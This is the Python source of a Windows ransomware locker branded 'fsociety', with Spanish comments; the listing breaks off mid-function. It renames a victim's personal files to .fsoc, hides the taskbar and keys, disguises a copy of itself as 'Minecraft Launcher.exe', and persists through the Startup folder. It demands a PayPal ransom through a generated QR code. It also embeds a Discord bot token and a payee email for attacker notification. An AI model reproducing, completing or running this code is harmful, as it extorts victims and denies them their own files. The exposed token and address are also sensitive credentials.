#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
=============================================================
   F S O C I E T Y   ::   L O C K E R   v9   ::   CRIMSON
   "hello, friend."
=============================================================
   - Pantalla completa limpia: sin bordes, sin boton de cerrar.
   - Clave por teclado -> restaura TODO.
   - Clave de UN SOLO USO: se entrega con !code, se consume al
     restaurar, y se rota automaticamente.
   - La clave NO se ve hasta que el atacante manda !code.
   - Bot Discord: !code revela la clave EN PANTALLA.
     !setcode NUEVA cambia la clave (funciona desde cualquier proceso).
   - Aviso automatico a Discord cuando hay ataque (con la clave).
   - Se instala solo en el inicio de Windows.
-------------------------------------------------------------
   v9: lock/unlock SOLO renombran (los bytes nunca se tocan).
       - reintentos para archivos en uso (WinError 32)
       - nunca pisa un archivo: usa "nombre (2).ext"
       - manifiesto auto-reparable si se pierde
       - --verify comprueba integridad (tamano) sin restaurar
=============================================================
   Ejecutar   : doble clic
   Clave      : escribe y ENTER
   Bot solo   : python fsociety.py --bot
   Panico     : python fsociety.py --rescue
   Verificar  : python fsociety.py --verify
   Inicio Win : python fsociety.py --install / --uninstall
   Salir      : Ctrl+Shift+Q
=============================================================
"""

from __future__ import annotations

import argparse
import atexit
import ctypes
import json
import math
import os
import queue
import random
import shutil
import string
import struct
import sys
import threading
import time
import webbrowser
import zlib
from pathlib import Path
from urllib.parse import quote

# ===========================================================
#  1) CONFIGURACION   <-- TOCA AQUI
# ===========================================================

CODE     = "Jacks"                 # clave por defecto (luego se rota sola o con !setcode)
LOCK_EXT = ".fsoc"

ROTATE_ON_UNLOCK = True            # rota la clave al restaurar (clave de un solo uso)

# --- QUE TANTO REVELA LA INTERFAZ A LA VICTIMA ---
UI_VERBOSE = False                 # False = criptico (nada del proceso). True = narra todo.

# --- COBRO ---
PAY_MODE      = "email"
PAYPAL_EMAIL  = "gerardojaimeszx@gmail.com"   # <<< TU CORREO DE PAYPAL
PAYPAL_HANDLE = "gerardojaimeszx"
RANSOM_AMOUNT = "3.00"
RANSOM_CURR   = "USD"
DEADLINE_H    = 72

# --- DISCORD ---
DISCORD_TOKEN = "MTU2NDEzMzQzMTY4MjY2NjYwOQ.GYSjhc.NncO-9ekSOAs_xVUDXa5ck5e_1ZJpNSyA-_4K0"
BOT_AUTOSTART = True
NOTIFY_ON_ATTACK = True            # avisa a discord cuando hay ataque/restauracion
NOTIFY_CHANNEL   = ""              # ID de canal para los avisos (usa !id para obtenerlo)
OWNER_ID         = ""              # si lo pones, SOLO el puede usar !setcode y recibe DM

NAME_STYLE     = "stem"
BLOCK_WIN_KEY  = True
HARD_MODE      = True
HIDE_TASKBAR   = True
AUTOSTART_ON_BOOT = True
SHOW_QR        = True

HOME     = Path(os.path.expanduser("~"))
BASE     = HOME / ".fsociety"
MANIFEST = BASE / "manifest.json"
CONFIG   = BASE / "config.json"
ICON     = BASE / "fsociety.ico"
FACE     = BASE / "face.png"
QRPNG    = BASE / "paypal_qr.png"
QRTXT    = BASE / "qr_url.txt"
SELFCOPY = BASE / "Minecraft Launcher.exe"
VERMARK  = BASE / "ver.txt"
ASSET_VER = "crimson-v9"           # sube esto si quieres forzar regenerar assets

TARGETS = [HOME / "Desktop", HOME / "Documents", HOME / "Downloads",
           HOME / "Pictures", HOME / "Videos", HOME / "Music"]
_od = os.environ.get("OneDrive")
if _od:
    for _s in ("Desktop", "Documents", "Pictures"):
        TARGETS.append(Path(_od) / _s)

PROGID   = "FSociety.LockedFile"
SKIPNAME = {"desktop.ini", "thumbs.db", "Thumbs.db", ".DS_Store"}

# ---- PALETA CRIMSON / FSOCIETY ----
RD        = "#ff0f2a"
RD_MID    = "#c20018"
RD_DIM    = "#7a0010"
RD_DARK   = "#260004"
ACC       = "#f2f2f2"
ACC_DIM   = "#5c4a4a"
BLACK     = "#000000"

_CODE_ALPHABET = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"

STATE = {"code": CODE, "key_shown": "", "mtime": 0.0}
CFG_LOCK = threading.Lock()

BOT_Q: queue.Queue = queue.Queue()

_MUTEX = None


def new_code(n=5) -> str:
    return "".join(random.choice(_CODE_ALPHABET) for _ in range(n))


def cur_code() -> str:
    return STATE.get("code") or CODE


def pay_url(with_amount=True) -> str:
    if PAY_MODE == "handle" and PAYPAL_HANDLE:
        a = RANSOM_AMOUNT.rstrip("0").rstrip(".") if "." in RANSOM_AMOUNT else RANSOM_AMOUNT
        if with_amount:
            return f"https://paypal.me/{PAYPAL_HANDLE}/{a}{RANSOM_CURR}"
        return f"https://paypal.me/{PAYPAL_HANDLE}"
    url = "https://paypal.com/cgi-bin/webscr?cmd=_xclick&business=" + quote(PAYPAL_EMAIL)
    if with_amount:
        url += f"&amount={RANSOM_AMOUNT}&currency_code={RANSOM_CURR}"
    return url


# ===========================================================
#  1b) ESTADO PERSISTENTE (compartido entre procesos) + AUTOSTART
# ===========================================================

def load_config(force=False) -> bool:
    """Devuelve True si algo cambio. El lock lo llama cada segundo."""
    try:
        mt = CONFIG.stat().st_mtime
    except Exception:
        return False
    if not force and mt == STATE.get("mtime"):
        return False
    try:
        d = json.loads(CONFIG.read_text(encoding="utf-8"))
    except Exception:
        return False
    if not isinstance(d, dict):
        return False
    ch = False
    code = str(d.get("code") or "")
    if code and code != STATE["code"]:
        STATE["code"] = code
        ch = True
    ks = str(d.get("key_shown") or "")
    if ks != STATE["key_shown"]:
        STATE["key_shown"] = ks
        ch = True
    STATE["mtime"] = mt
    return ch


def save_config():
    with CFG_LOCK:
        try:
            BASE.mkdir(parents=True, exist_ok=True)
            CONFIG.write_text(
                json.dumps({"code": STATE["code"], "key_shown": STATE["key_shown"]},
                           ensure_ascii=False, indent=1),
                encoding="utf-8")
            STATE["mtime"] = CONFIG.stat().st_mtime
        except Exception:
            pass


def startup_dir() -> Path:
    return (Path(os.environ.get("APPDATA", str(HOME)))
            / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup")


def install_startup() -> bool:
    if os.name != "nt":
        return False
    try:
        d = startup_dir()
        if not d.exists():
            return False
        pyw = Path(sys.executable)
        c = pyw.with_name("pythonw.exe")
        if c.exists():
            pyw = c
        bat = d / "fsociety.bat"
        bat.write_text(f'@echo off\r\nstart "" "{pyw}" "{SELFCOPY}"\r\n', encoding="utf-8")
        return True
    except Exception:
        return False


def uninstall_startup() -> bool:
    try:
        f = startup_dir() / "fsociety.bat"
        if f.exists():
            f.unlink()
        return True
    except Exception:
        return False


def single_instance() -> bool:
    global _MUTEX
    if os.name != "nt":
        return True
    try:
        k32 = ctypes.WinDLL("kernel32", use_last_error=True)
        k32.CreateMutexW.restype = ctypes.c_void_p
        k32.CreateMutexW.argtypes = [ctypes.c_void_p, ctypes.c_int, ctypes.c_wchar_p]
        _MUTEX = k32.CreateMutexW(None, 0, "Local\\fsociety_locker")
        return ctypes.get_last_error() != 183
    except Exception:
        return True


def taskbar(show: bool):
    if os.name != "nt":
        return
    try:
        u32 = ctypes.windll.user32
        u32.FindWindowW.restype = ctypes.c_void_p
        u32.FindWindowW.argtypes = [ctypes.c_wchar_p, ctypes.c_wchar_p]
        u32.ShowWindow.argtypes = [ctypes.c_void_p, ctypes.c_int]
        for cls in ("Shell_TrayWnd", "Shell_SecondaryTrayWnd"):
            h = u32.FindWindowW(cls, None)
            if h:
                u32.ShowWindow(h, 5 if show else 0)
    except Exception:
        pass


atexit.register(lambda: taskbar(True))


# ===========================================================
#  2) MASCARA FSOCIETY  (ROJA)
# ===========================================================

def _render_mask(S: int) -> bytes:
    """Mascara fsociety roja sobre transparente."""
    buf = bytearray(S * S * 4)
    cx, cy = S * 0.5, S * 0.505
    rad = S * 0.16
    rx, ry = S * 0.330, S * 0.400
    ex = S * 0.150
    ey = cy - S * 0.055
    ea, eb = S * 0.108, S * 0.042
    ang = 0.32
    ca, sa = math.cos(ang), math.sin(ang)
    ojos = ((cx - ex, ca, sa), (cx + ex, ca, -sa))
    nose_w = S * 0.020
    ny0, ny1 = cy - S * 0.004, cy + S * 0.058
    mx, my, mr, mb = cx, cy + 0.074 * S, 0.188 * S, 0.023 * S
    rad2 = rad * rad

    for y in range(S):
        yc = y + 0.5
        row = y * S
        d = abs(yc - cy) - (cy - rad)
        dy0 = (d * d) if d > 0 else 0.0
        for x in range(S):
            xc = x + 0.5
            i = (row + x) * 4
            d = abs(xc - cx) - (cx - rad)
            dx0 = (d * d) if d > 0 else 0.0
            if dx0 + dy0 > rad2:
                continue
            buf[i] = 13; buf[i + 1] = 3; buf[i + 2] = 6; buf[i + 3] = 255

            u = (xc - cx) / rx
            v = (yc - cy) / ry
            if v > 0:
                u /= (1.0 - 0.50 * v * v)
            au, av = abs(u), abs(v)
            k = au ** 2.7 + av ** 2.7
            if k > 1.0:
                continue
            if k > 0.87:                       # contorno rojo brillante
                buf[i] = 255; buf[i + 1] = 34; buf[i + 2] = 52
                continue

            ojo = False
            for (ox, c2, s2) in ojos:
                ddx = xc - ox
                ddy = yc - ey
                u2 = ddx * c2 + ddy * s2
                v2 = -ddx * s2 + ddy * c2
                if (u2 / ea) ** 2 + (v2 / eb) ** 2 <= 1.0:
                    ojo = True
                    break
            if ojo:
                buf[i + 3] = 255
                continue

            if abs(xc - cx) < nose_w and ny0 < yc < ny1:
                buf[i] = 70; buf[i + 1] = 7; buf[i + 2] = 12; buf[i + 3] = 255
                continue

            dmx = xc - mx
            dmy = yc - my
            if dmy > 0 and abs(math.sqrt(dmx * dmx + dmy * dmy) - mr) <= mb:
                buf[i + 3] = 255
                continue

            t = (yc - (cy - ry)) / (2 * ry)
            t = 0.0 if t < 0 else (1.0 if t > 1 else t)
            g = int(255 - 120 * t)
            buf[i] = g; buf[i + 1] = int(g * 0.12); buf[i + 2] = int(g * 0.19); buf[i + 3] = 255
    return bytes(buf)


def _render_icon_img(S: int) -> bytes:
    """Icono: cuadro negro redondeado con la mascara roja centrada."""
    buf = bytearray(S * S * 4)
    rad = S * 0.20
    cx = cy = S * 0.5
    for y in range(S):
        for x in range(S):
            i = (y * S + x) * 4
            dx = abs(x + 0.5 - cx) - (cx - rad); dx = dx if dx > 0 else 0.0
            dy = abs(y + 0.5 - cy) - (cy - rad); dy = dy if dy > 0 else 0.0
            if dx * dx + dy * dy > rad * rad:
                continue
            t = (y + 0.5) / S
            v = int(20 - 15 * t)
            buf[i] = v + 3; buf[i + 1] = max(0, v - 9); buf[i + 2] = max(0, v - 7); buf[i + 3] = 255
    mask = _render_mask(S)
    sc = 0.84
    off = (1 - sc) / 2 * S
    for y in range(S):
        for x in range(S):
            di = (y * S + x) * 4
            if buf[di + 3] == 0:
                continue
            sx = int((x - off) / sc); sy = int((y - off) / sc)
            if not (0 <= sx < S and 0 <= sy < S):
                continue
            si = (sy * S + sx) * 4
            if mask[si + 3] == 0:
                continue
            buf[di] = mask[si]; buf[di + 1] = mask[si + 1]
            buf[di + 2] = mask[si + 2]; buf[di + 3] = 255
    return bytes(buf)


def _resize(src, S, out):
    dst = bytearray(out * out * 4)
    for y in range(out):
        y0 = (y * S) // out
        y1 = max(y0 + 1, ((y + 1) * S) // out)
        for x in range(out):
            x0 = (x * S) // out
            x1 = max(x0 + 1, ((x + 1) * S) // out)
            r = g = b = a = n = 0
            for yy in range(y0, y1):
                row = yy * S
                for xx in range(x0, x1):
                    i = (row + xx) * 4
                    r += src[i]; g += src[i + 1]; b += src[i + 2]; a += src[i + 3]
                    n += 1
            o = (y * out + x) * 4
            dst[o] = r // n; dst[o + 1] = g // n
            dst[o + 2] = b // n; dst[o + 3] = a // n
    return bytes(dst)


def _png(w, h, rgba):
    stride = w * 4
    raw = bytearray()
    for y in range(h):
        raw.append(0)
        raw += rgba[y * stride:(y + 1) * stride]

    def chunk(tag, data):
        return (struct.pack(">I", len(data)) + tag + data
                + struct.pack(">I", zlib.crc32(tag + data) & 0xFFFFFFFF))

    return (b"\x89PNG\r\n\x1a\n"
            + chunk(b"IHDR", struct.pack(">IIBBBBB", w, h, 8, 6, 0, 0, 0))
            + chunk(b"IDAT", zlib.compress(bytes(raw), 9))
            + chunk(b"IEND", b""))


def _ico(entries):
    n = len(entries)
    head = struct.pack("<HHH", 0, 1, n)
    off = 6 + 16 * n
    dpart, data = b"", b""
    for size, png in entries:
        b = 0 if size >= 256 else size
        dpart += struct.pack("<BBBBHHII", b, b, 0, 0, 1, 32, len(png), off)
        off += len(png)
        data += png
    return head + dpart + data


def build_icon(force=False):
    BASE.mkdir(parents=True, exist_ok=True)
    if ICON.exists() and not force and ICON.stat().st_size > 2000:
        return
    S = 512
    src = _render_icon_img(S)
    entries = [(s, _png(s, s, _resize(src, S, s))) for s in (16, 24, 32, 48, 64, 128, 256)]
    ICON.write_bytes(_ico(entries))


def build_face(force=False, px=210):
    BASE.mkdir(parents=True, exist_ok=True)
    if FACE.exists() and not force:
        return True
    try:
        S = px * 2
        FACE.write_bytes(_png(px, px, _resize(_render_mask(S), S, px)))
        return True
    except Exception:
        return False


def ensure_assets(force=False):
    """Regenera icono/cara/qr si la version de assets cambio."""
    try:
        ok = VERMARK.read_text(encoding="utf-8").strip() == ASSET_VER
    except Exception:
        ok = False
    if ok and not force:
        return
    build_icon(True)
    build_face(True)
    build_qr(True)
    try:
        VERMARK.write_text(ASSET_VER, encoding="utf-8")
    except Exception:
        pass


# ===========================================================
#  3) QR  (blanco + modulos rojo oscuro, escaneable)
# ===========================================================

_GF_EXP = [0] * 512
_GF_LOG = [0] * 256
_x = 1
for _i in range(255):
    _GF_EXP[_i] = _x
    _GF_LOG[_x] = _i
    _x <<= 1
    if _x & 0x100:
        _x ^= 0x11D
for _i in range(255, 512):
    _GF_EXP[_i] = _GF_EXP[_i - 255]

_QR_BLOCKS = {1: (26, 7, [(1, 19)]), 2: (44, 10, [(1, 34)]), 3: (70, 15, [(1, 55)]),
              4: (100, 20, [(1, 80)]), 5: (134, 26, [(1, 108)]), 6: (172, 18, [(2, 68)]),
              7: (196, 20, [(2, 78)]), 8: (242, 24, [(2, 97)]), 9: (292, 30, [(2, 116)]),
              10: (346, 18, [(2, 68), (2, 69)])}
_QR_ALIGN = {1: [], 2: [6, 18], 3: [6, 22], 4: [6, 26], 5: [6, 30], 6: [6, 34],
             7: [6, 22, 38], 8: [6, 24, 42], 9: [6, 26, 46], 10: [6, 28, 50]}


def _gf_mul(a, b):
    return 0 if (a == 0 or b == 0) else _GF_EXP[_GF_LOG[a] + _GF_LOG[b]]


def _rs_gen(n):
    g = [1]
    for i in range(n):
        r = [0] * (len(g) + 1)
        for j, c in enumerate(g):
            r[j] ^= c
            r[j + 1] ^= _gf_mul(c, _GF_EXP[i])
        g = r
    return g


def _rs_encode(data, n):
    gen = _rs_gen(n)
    res = list(data) + [0] * n
    for i in range(len(data)):
        c = res[i]
        if c:
            for j, g in enumerate(gen):
                res[i + j] ^= _gf_mul(g, c)
    return res[len(data):]


def _pick_version(n):
    for v in range(1, 11):
        total, ec, blocks = _QR_BLOCKS[v]
        cap = (total - ec * sum(b[0] for b in blocks)) - (2 if v <= 9 else 3)
        if n <= cap:
            return v
    return None


def _codewords(data, version):
    total, ec, blocks = _QR_BLOCKS[version]
    cap = total - ec * sum(b[0] for b in blocks)
    cbits = 8 if version <= 9 else 16
    bits = [0, 1, 0, 0] + [(len(data) >> i) & 1 for i in range(cbits - 1, -1, -1)]
    for b in data:
        bits += [(b >> i) & 1 for i in range(7, -1, -1)]
    for _ in range(min(4, cap * 8 - len(bits))):
        bits.append(0)
    while len(bits) % 8:
        bits.append(0)
    cw = [int("".join(str(b) for b in bits[i:i + 8]), 2) for i in range(0, len(bits), 8)]
    k = 0
    while len(cw) < cap:
        cw.append((0xEC, 0x11)[k % 2]); k += 1
    return cw


def _interleave(cw, version):
    total, ec, blocks = _QR_BLOCKS[version]
    datas, ecs, idx = [], [], 0
    for count, dlen in blocks:
        for _ in range(count):
            d = cw[idx:idx + dlen]; idx += dlen
            datas.append(d); ecs.append(_rs_encode(d, ec))
    out = []
    for i in range(max(len(d) for d in datas)):
        for d in datas:
            if i < len(d):
                out.append(d[i])
    for i in range(max(len(e) for e in ecs)):
        for e in ecs:
            if i < len(e):
                out.append(e[i])
    return out


def _base_matrix(version):
    size = version * 4 + 17
    m = [[0] * size for _ in range(size)]
    res = [[False] * size for _ in range(size)]

    def finder(r0, c0):
        for dr in range(-1, 8):
            for dc in range(-1, 8):
                rr, cc = r0 + dr, c0 + dc
                if 0 <= rr < size and 0 <= cc < size:
                    v = 0
                    if 0 <= dr <= 6 and 0 <= dc <= 6:
                        v = 1 if (dr in (0, 6) or dc in (0, 6)
                                 or (2 <= dr <= 4 and 2 <= dc <= 4)) else 0
                    m[rr][cc] = v; res[rr][cc] = True

    finder(0, 0); finder(0, size - 7); finder(size - 7, 0)
    for i in range(8, size - 8):
        v = 1 if i % 2 == 0 else 0
        m[6][i] = v; res[6][i] = True
        m[i][6] = v; res[i][6] = True
    for r in _QR_ALIGN[version]:
        for c in _QR_ALIGN[version]:
            if res[r][c]:
                continue
            for dr in range(-2, 3):
                for dc in range(-2, 3):
                    rr, cc = r + dr, c + dc
                    if 0 <= rr < size and 0 <= cc < size:
                        m[rr][cc] = 1 if max(abs(dr), abs(dc)) != 1 else 0
                        res[rr][cc] = True
    for i in range(9):
        res[8][i] = True; res[i][8] = True
    for i in range(8):
        res[8][size - 1 - i] = True; res[size - 1 - i][8] = True
    m[size - 8][8] = 1; res[size - 8][8] = True
    if version >= 7:
        for i in range(18):
            res[i // 3][size - 11 + i % 3] = True
            res[size - 11 + i % 3][i // 3] = True
    return m, res, size


def _place(m, res, bits, size):
    i, col, up = 0, size - 1, True
    while col > 0:
        if col == 6:
            col -= 1
        for k in range(size):
            row = (size - 1 - k) if up else k
            for c in (col, col - 1):
                if not res[row][c]:
                    m[row][c] = bits[i] if i < len(bits) else 0
                    i += 1
        up = not up
        col -= 2


def _maskfn(mask, r, c):
    return ((r + c) % 2 == 0, r % 2 == 0, c % 3 == 0, (r + c) % 3 == 0,
            (r // 2 + c // 3) % 2 == 0, (r * c) % 2 + (r * c) % 3 == 0,
            ((r * c) % 2 + (r * c) % 3) % 2 == 0,
            ((r + c) % 2 + (r * c) % 3) % 2 == 0)[mask]


def _place_format(m, size, mask):
    data = (1 << 3) | mask
    rem = data << 10
    for i in range(14, 9, -1):
        if rem & (1 << i):
            rem ^= 0x537 << (i - 10)
    bits = ((data << 10) | rem) ^ 0x5412
    for i in range(6):
        m[i][8] = (bits >> i) & 1
    m[7][8] = (bits >> 6) & 1
    m[8][8] = (bits >> 7) & 1
    m[8][7] = (bits >> 8) & 1
    for i in range(9, 15):
        m[8][14 - i] = (bits >> i) & 1
    for i in range(8):
        m[8][size - 1 - i] = (bits >> i) & 1
    for i in range(8, 15):
        m[size - 15 + i][8] = (bits >> i) & 1


def _place_version(m, size, version):
    rem = version << 12
    for i in range(17, 11, -1):
        if rem & (1 << i):
            rem ^= 0x1F25 << (i - 12)
    bits = (version << 12) | rem
    for i in range(18):
        b = (bits >> i) & 1
        m[i // 3][size - 11 + i % 3] = b
        m[size - 11 + i % 3][i // 3] = b


def _penalty(m, size):
    p = 0
    for i in range(size):
        for seq in (m[i], [m[r][i] for r in range(size)]):
            run = 1
            for j in range(1, size):
                if seq[j] == seq[j - 1]:
                    run += 1
                else:
                    if run >= 5:
                        p += 3 + run - 5
                    run = 1
            if run >= 5:
                p += 3 + run - 5
    for r in range(size - 1):
        for c in range(size - 1):
            if m[r][c] == m[r][c + 1] == m[r + 1][c] == m[r + 1][c + 1]:
                p += 3
    pat = [1, 0, 1, 1, 1, 0, 1, 0, 0, 0, 0]
    rpat = pat[::-1]
    for r in range(size):
        for c in range(size - 10):
            seg = m[r][c:c + 11]
            if seg == pat or seg == rpat:
                p += 40
    for c in range(size):
        for r in range(size - 10):
            seg = [m[r + k][c] for k in range(11)]
            if seg == pat or seg == rpat:
                p += 40
    return p


def qr_matrix(text):
    data = text.encode()
    version = _pick_version(len(data))
    if version is None:
        return None
    stream = _interleave(_codewords(data, version), version)
    bits = []
    for b in stream:
        bits += [(b >> i) & 1 for i in range(7, -1, -1)]
    base, res, size = _base_matrix(version)
    _place(base, res, bits, size)
    best = None
    for mask in range(8):
        m = [row[:] for row in base]
        for r in range(size):
            for c in range(size):
                if not res[r][c] and _maskfn(mask, r, c):
                    m[r][c] ^= 1
        _place_format(m, size, mask)
        if version >= 7:
            _place_version(m, size, version)
        p = _penalty(m, size)
        if best is None or p < best[0]:
            best = (p, m)
    return best[1]


def build_qr(force=False, maxpx=200):
    if not SHOW_QR:
        return False
    BASE.mkdir(parents=True, exist_ok=True)
    url = pay_url(True)
    if QRPNG.exists() and not force and QRTXT.exists():
        try:
            if QRTXT.read_text(encoding="utf-8").strip() == url:
                return True
        except Exception:
            pass
    try:
        m = qr_matrix(url)
        if m is None:
            return False
        n = len(m)
        quiet = 4
        scale = max(3, maxpx // (n + quiet * 2))
        S = (n + quiet * 2) * scale
        buf = bytearray(S * S * 4)
        for i in range(0, len(buf), 4):
            buf[i] = 250; buf[i + 1] = 249; buf[i + 2] = 250; buf[i + 3] = 255
        for r in range(n):
            for c in range(n):
                if m[r][c]:
                    y0 = (r + quiet) * scale
                    x0 = (c + quiet) * scale
                    for dy in range(scale):
                        row = (y0 + dy) * S
                        for dx in range(scale):
                            i = (row + x0 + dx) * 4
                            buf[i] = 148; buf[i + 1] = 0; buf[i + 2] = 22
        # marco rojo exterior
        fr = max(2, S // 90)
        for k in range(fr):
            for x in range(S):
                for y in (k, S - 1 - k):
                    i = (y * S + x) * 4
                    buf[i] = 255; buf[i + 1] = 15; buf[i + 2] = 42
            for y in range(S):
                for x in (k, S - 1 - k):
                    i = (y * S + x) * 4
                    buf[i] = 255; buf[i + 1] = 15; buf[i + 2] = 42
        QRPNG.write_bytes(_png(S, S, bytes(buf)))
        QRTXT.write_text(url, encoding="utf-8")
        return True
    except Exception:
        return False


# ===========================================================
#  4) REGISTRO DE WINDOWS
# ===========================================================

def _refresh_shell():
    try:
        ctypes.windll.shell32.SHChangeNotify(0x08000000, 0x1000, None, None)
    except Exception:
        pass


def register_icon():
    if os.name != "nt":
        return
    import winreg
    pyw = Path(sys.executable)
    cand = pyw.with_name("pythonw.exe")
    if cand.exists():
        pyw = cand
    cmd = f'"{pyw}" "{SELFCOPY}" --gui "%1"'
    try:
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, rf"Software\Classes\{LOCK_EXT}") as k:
            winreg.SetValueEx(k, "", 0, winreg.REG_SZ, PROGID)
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, rf"Software\Classes\{LOCK_EXT}\DefaultIcon") as k:
            winreg.SetValueEx(k, "", 0, winreg.REG_SZ, str(ICON))
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, rf"Software\Classes\{PROGID}") as k:
            winreg.SetValueEx(k, "", 0, winreg.REG_SZ, "Archivo secuestrado por fsociety")
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, rf"Software\Classes\{PROGID}\DefaultIcon") as k:
            winreg.SetValueEx(k, "", 0, winreg.REG_SZ, str(ICON))
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, rf"Software\Classes\{PROGID}\shell\open\command") as k:
            winreg.SetValueEx(k, "", 0, winreg.REG_SZ, cmd)
        _refresh_shell()
    except Exception:
        pass


def unregister_icon():
    if os.name != "nt":
        return
    import winreg
    for sub in (rf"Software\Classes\{PROGID}\shell\open\command",
                rf"Software\Classes\{PROGID}\shell\open",
                rf"Software\Classes\{PROGID}\shell",
                rf"Software\Classes\{PROGID}\DefaultIcon",
                rf"Software\Classes\{PROGID}",
                rf"Software\Classes\{LOCK_EXT}\DefaultIcon",
                rf"Software\Classes\{LOCK_EXT}"):
        try:
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, sub)
        except OSError:
            pass
    _refresh_shell()


def hide(p):
    if os.name == "nt":
        try:
            ctypes.windll.kernel32.SetFileAttributesW(str(p), 2)
        except Exception:
            pass


# ===========================================================
#  5) MAGIC BYTES  (solo para el rescate de huerfanos)
# ===========================================================

MAGIC = [(b"\x89PNG\r\n\x1a\n", ".png"), (b"\xff\xd8\xff", ".jpg"),
         (b"GIF8", ".gif"), (b"%PDF", ".pdf"), (b"\xd0\xcf\x11\xe0", ".doc"),
         (b"\x1f\x8b", ".gz"), (b"7z\xbc\xaf", ".7z"), (b"Rar!\x1a", ".rar"),
         (b"ID3", ".mp3"), (b"fLaC", ".flac"), (b"OggS", ".ogg"),
         (b"SQLite format 3", ".db"), (b"MZ", ".exe"), (b"BM", ".bmp"),
         (b"II*\x00", ".tif"), (b"MM\x00*", ".tif"),
         (b"L\x00\x00\x00\x01\x14\x02\x00\x00\x00\x00\x00\xc0\x00\x00\x00", ".lnk")]


def guess_ext(p):
    try:
        with open(p, "rb") as f:
            head = f.read(16384)
    except Exception:
        return ""
    if not head:
        return ".txt"
    if head.startswith(b"PK\x03\x04") or head.startswith(b"PK\x05\x06"):
        for marker, e in ((b"word/", ".docx"), (b"xl/", ".xlsx"), (b"ppt/", ".pptx"),
                          (b"mimetypeapplication/epub", ".epub")):
            if marker in head:
                return e
        return ".zip"
    if head.startswith(b"RIFF"):
        return {b"WEBP": ".webp", b"WAVE": ".wav", b"AVI ": ".avi"}.get(head[8:12], ".bin")
    if head[4:8] == b"ftyp":
        return {b"heic": ".heic", b"heix": ".heic", b"mif1": ".heic",
                b"qt  ": ".mov"}.get(head[8:12], ".mp4")
    for sig, ext in MAGIC:
        if head.startswith(sig):
            return ext
    try:
        head.decode("utf-8")
    except Exception:
        return ""
    s = head.lstrip()
    if s.startswith(b"{") or s.startswith(b"["):
        return ".json"
    if s.startswith(b"<?xml"):
        return ".xml"
    if s.startswith(b"<svg"):
        return ".svg"
    if s[:5].lower() in (b"<!doc", b"<html"):
        return ".html"
    return ".txt"


# ===========================================================
#  6) NUCLEO  (solo se RENOMBRA: los bytes nunca se modifican)
# ===========================================================

def _listdir(d):
    try:
        return os.listdir(d)
    except Exception:
        return []


def _size(p):
    try:
        return p.stat().st_size
    except Exception:
        return -1


def _unique_name(dst: Path, taken: set) -> Path:
    """Devuelve 'nombre (n).ext' libre dentro de taken (en minusculas)."""
    stem, suf = dst.stem, dst.suffix
    i = 2
    while True:
        cand = dst.with_name(f"{stem} ({i}){suf}")
        if str(cand).lower() not in taken:
            return cand
        i += 1


def _move(src: Path, dst: Path, taken: set, tries: int = 12):
    """
    Renombra src -> dst. NO toca el contenido (integridad de encabezados).
    - Reintenta con backoff si el archivo esta en uso (WinError 32/5).
    - Si dst ya existe, busca hueco 'nombre (2).ext' en vez de fallar.
    Devuelve la ruta final o None.
    """
    if not src.exists():
        return None
    cand = dst
    delay = 0.02
    for _ in range(tries):
        if str(cand).lower() in taken and str(cand).lower() != str(src).lower():
            cand = _unique_name(cand, taken)
        try:
            os.rename(src, cand)          # os.rename (no replace): no pisa nada
            taken.add(str(cand).lower())
            return cand
        except FileExistsError:
            cand = _unique_name(cand, taken)
        except FileNotFoundError:
            return None
        except OSError:                   # archivo en uso -> esperar y reintentar
            time.sleep(delay)
            delay = min(delay * 1.6, 0.35)
    return None


def iter_files(targets):
    seen = set()
    for t in targets:
        t = Path(t)
        if not t.exists():
            continue
        for root, _dirs, files in os.walk(t):
            rp = Path(root)
            if rp == BASE or BASE in rp.parents:
                continue
            for f in files:
                if f in SKIPNAME or f.startswith("~$"):
                    continue
                p = rp / f
                if p.suffix.lower() == LOCK_EXT:
                    continue
                k = str(p).lower()
                if k in seen:
                    continue
                seen.add(k)
                yield p


def _locked_name(p, taken):
    base = p.stem if (NAME_STYLE == "stem" and p.suffix) else p.name
    cand = base + LOCK_EXT
    i = 2
    while cand.lower() in taken:
        cand = f"{base} ({i}){LOCK_EXT}"
        i += 1
    return cand


def _load_manifest():
    try:
        data = json.loads(MANIFEST.read_text(encoding="utf-8"))
    except Exception:
        return [], None
    if not isinstance(data, dict):
        return [], None
    return (data.get("files") or []), data


def _scan_locked(targets):
    """Reconstruye entradas [dir, locked, original, size] de .fsoc huerfanos."""
    out = []
    for t in targets:
        t = Path(t)
        if not t.exists():
            continue
        for root, _dirs, fs in os.walk(t):
            rp = Path(root)
            if rp == BASE or BASE in rp.parents:
                continue
            for f in fs:
                if not f.endswith(LOCK_EXT):
                    continue
                lp = rp / f
                base = f[:-len(LOCK_EXT)]
                on = base if NAME_STYLE == "name" else base + guess_ext(lp)
                out.append([str(rp), f, on, _size(lp)])
    return out


def lock(targets, progress=None):
    BASE.mkdir(parents=True, exist_ok=True)
    ensure_assets()
    try:
        shutil.copy2(Path(__file__).resolve(), SELFCOPY)
    except Exception:
        pass
    register_icon()
    if AUTOSTART_ON_BOOT:
        install_startup()

    by_dir = {}
    for p in iter_files(targets):
        by_dir.setdefault(str(p.parent), []).append(p)

    files = []
    for d, paths in by_dir.items():
        taken = {x.lower() for x in _listdir(d)}
        for p in sorted(paths, key=lambda x: x.name.lower()):
            new = _locked_name(p, taken)
            final = _move(p, p.with_name(new), taken)
            if final is None:
                continue                     # en uso irremediable -> se deja igual
            files.append([d, final.name, p.name, _size(final)])
            if progress and len(files) % 25 == 0:
                progress(len(files))

    MANIFEST.write_text(json.dumps({"t": time.time(), "n": len(files), "files": files},
                                   ensure_ascii=False), encoding="utf-8")
    hide(BASE)
    _refresh_shell()

    # ATAQUE NUEVO -> la clave arranca OCULTA hasta que el atacante haga !code
    STATE["key_shown"] = ""
    save_config()
    if progress:
        progress(len(files))
    return len(files)


def unlock(targets=None, progress=None):
    targets = targets or TARGETS
    items, _data = _load_manifest()
    if not items:
        items = _scan_locked(targets)        # manifiesto perdido -> rescatar huerfanos
    if not items:
        return 0, 0

    total = len(items)
    done, fallos = 0, []
    for i, item in enumerate(items):
